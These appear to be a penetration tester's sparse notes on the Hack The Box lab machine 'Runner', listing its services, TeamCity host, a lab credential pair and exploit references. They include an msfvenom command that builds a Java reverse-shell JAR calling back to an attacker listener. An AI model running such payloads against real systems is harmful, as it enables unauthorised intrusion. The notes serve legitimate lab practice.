# Runner Notes

## Data

IP: 10.129.19.125
OS: Jammy Ubuntu
Arch: x64
Hostname:
DNS:
Domain:  runner.htb teamcity.runner.htb
Machine Purpose:
Services: 22, nginx - 80 , nagios-nsca on 8000
Service Languages:
Users:
Email and Username Formatting:
Credentials:

```
s6hq4rmy : f8jWYWEFxo
```


#### Mindmap-per Service

- OS detect, run generate noting for `nmap`
-
-
-
-
- Not: 
	- https://ubuntu.com/security/CVE-2022-41741
-
-
-
- https://www.exploit-db.com/exploits/51884
-
-
-
-
-
- ssh keys

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=8443 --platform linux -a x64 -f jar
-o shellcity.jar
```

https://attackdefense.com/challengedetailsnoauth?cid=1459
#### Todo List
#### Done


